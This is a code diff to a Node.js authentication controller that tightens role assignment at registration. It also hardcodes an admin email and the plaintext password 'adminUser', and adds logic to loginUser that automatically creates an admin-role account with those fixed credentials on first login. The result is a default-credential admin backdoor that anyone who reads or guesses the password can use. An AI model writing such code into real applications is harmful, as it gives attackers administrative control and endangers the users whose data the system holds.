@@ -5,10 +5,20 @@ const User = require('../models/User');
 const asyncHandler = require('../utils/asyncHandler');
 const generateToken = require('../utils/generateToken');
 
+const ADMIN_EMAIL = 'admin@admin.com';
+const ADMIN_PASSWORD = 'adminUser';
+
 const registerUser = asyncHandler(async (req, res) => {
     const data = matchedData(req);
 
     const { name, email, password, role } = data;
+
+    if (email === ADMIN_EMAIL) {
+        return res.status(403).json({
+            success: false,
+            message: 'This email is reserved',
+        });
+    }
 
     const existingUser = await User.findOne({ email });
 
@@ -20,12 +30,13 @@ const registerUser = asyncHandler(async (req, res) => {
     }
 
     const hashedPassword = await bcrypt.hash(password, 10);
+    const safeRole = role === 'agent' ? 'agent' : 'buyer';
 
     const user = await User.create({
         name,
         email,
         password: hashedPassword,
-        role: role || 'buyer',
+        role: safeRole,
     });
 
     const token = generateToken(user._id);
@@ -50,7 +61,19 @@ const loginUser = asyncHandler(async (req, res) => {
 
     const { email, password } = data;
 
-    const user = await User.findOne({ email }).select('+password');
+    let user = await User.findOne({ email }).select('+password');
+
+    // Ensure the one allowed admin account always exists with fixed credentials.
+    if (!user && email === ADMIN_EMAIL) {
+        const adminHashedPassword = await bcrypt.hash(ADMIN_PASSWORD, 10);
+        user = await User.create({
+            name: 'Admin User',
+            email: ADMIN_EMAIL,
+            password: adminHashedPassword,
+            role: 'admin',
+        });
+        user = await User.findById(user._id).select('+password');
+    }
 
     if (!user) {
         return res.status(401).json({
